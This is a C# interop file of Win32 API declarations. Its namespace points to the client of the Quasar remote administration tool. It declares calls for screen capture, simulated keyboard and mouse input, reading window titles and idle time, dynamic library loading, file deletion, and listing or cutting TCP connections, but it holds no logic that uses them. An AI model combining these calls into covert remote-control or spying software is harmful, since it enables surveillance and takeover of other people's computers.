﻿using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Quasar.Client.Utilities
{
    /// <summary>
    /// Provides access to Win32 API and Microsoft C Runtime Library (msvcrt.dll).
    /// </summary>
    public static class NativeMethods
    {
        [StructLayout(LayoutKind.Sequential)]
        internal struct LASTINPUTINFO
        {
            public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
            [MarshalAs(UnmanagedType.U4)] public UInt32 cbSize;
            [MarshalAs(UnmanagedType.U4)] public UInt32 dwTime;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool DeleteFile(string name);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("user32.dll")]
        internal static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [DllImport("user32.dll")]
        internal static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        internal static extern void mouse_event(uint dwFlags, int dx, int dy, int dwData, UIntPtr dwExtraInfo);

        [DllImport("user32.dll")]
        internal static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        /// <summary>
        ///    Performs a bit-block transfer of the color data corresponding to a
        ///    rectangle of pixels from the specified source device context into
        ///    a destination device context.
        /// </summary>
        /// <param name="hdc">Handle to the destination device context.</param>
        /// <param name="nXDest">The leftmost x-coordinate of the destination rectangle (in pixels).</param>
        /// <param name="nYDest">The topmost y-coordinate of the destination rectangle (in pixels).</param>
        /// <param name="nWidth">The width of the source and destination rectangles (in pixels).</param>
        /// <param name="nHeight">The height of the source and the destination rectangles (in pixels).</param>
        /// <param name="hdcSrc">Handle to the source device context.</param>
        /// <param name="nXSrc">The leftmost x-coordinate of the source rectangle (in pixels).</param>
        /// <param name="nYSrc">The topmost y-coordinate of the source rectangle (in pixels).</param>
        /// <param name="dwRop">A raster-operation code.</param>
        /// <returns>
        ///    <c>true</c> if the operation succeedes, <c>false</c> otherwise. To get extended error information, call <see cref="System.Runtime.InteropServices.Marshal.GetLastWin32Error"/>.
        /// </returns>
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight,
            [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll", CharSet = CharSet.Unicode)]
        internal static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData);

        [DllImport("gdi32.dll")]
        internal static extern bool DeleteDC([In] IntPtr hdc);

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        internal static extern unsafe int memcmp(byte* ptr1, byte* ptr2, uint count);

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        internal static extern int memcmp(IntPtr ptr1, IntPtr ptr2, uint count);

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        internal static extern int memcpy(IntPtr dst, IntPtr src, uint count);

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        internal static extern unsafe int memcpy(void* dst, void* src, uint count);

        [DllImport("user32.dll")]
        internal static extern bool SystemParametersInfo(
            uint uAction, uint uParam, ref IntPtr lpvParam,
            uint flags);

        [DllImport("user32.dll")]
        internal static extern bool SystemParametersInfo(
            uint uAction, uint uParam, ref bool lpvParam,
            uint flags);

        [DllImport("user32.dll")]
        internal static extern int PostMessage(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        internal static extern IntPtr OpenDesktop(
            string hDesktop, int flags, bool inherit,
            uint desiredAccess);

        [DllImport("user32.dll")]
        internal static extern bool CloseDesktop(
            IntPtr hDesktop);

        internal delegate bool EnumDesktopWindowsProc(
            IntPtr hDesktop, IntPtr lParam);

        [DllImport("user32.dll")]
        internal static extern bool EnumDesktopWindows(
            IntPtr hDesktop, EnumDesktopWindowsProc callback,
            IntPtr lParam);

        [DllImport("user32.dll")]
        internal static extern bool IsWindowVisible(
            IntPtr hWnd);

        [DllImport("user32.dll")]
        internal static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("iphlpapi.dll", SetLastError = true)]
        internal static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion,
            TcpTableClass tblClass, uint reserved = 0);

        [DllImport("iphlpapi.dll")]
        internal static extern int SetTcpEntry(IntPtr pTcprow);

        [StructLayout(LayoutKind.Sequential)]
        internal struct MibTcprowOwnerPid
        {
            public uint state;
            public uint localAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public byte[] localPort;
            public uint remoteAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public byte[] remotePort;
            public uint owningPid;

            public IPAddress LocalAddress
            {
                get { return new IPAddress(localAddr); }
            }

            public ushort LocalPort
            {
                get { return BitConverter.ToUInt16(new byte[2] { localPort[1], localPort[0] }, 0); }
            }

            public IPAddress RemoteAddress
            {
                get { return new IPAddress(remoteAddr); }
            }

            public ushort RemotePort
            {
                get { return BitConverter.ToUInt16(new byte[2] { remotePort[1], remotePort[0] }, 0); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct MibTcptableOwnerPid
        {
            public uint dwNumEntries;
            private readonly MibTcprowOwnerPid table;
        }

        internal enum TcpTableClass
        {
            TcpTableBasicListener,
            TcpTableBasicConnections,
            TcpTableBasicAll,
            TcpTableOwnerPidListener,
            TcpTableOwnerPidConnections,
            TcpTableOwnerPidAll,
            TcpTableOwnerModuleListener,
            TcpTableOwnerModuleConnections,
            TcpTableOwnerModuleAll
        }
    }
}
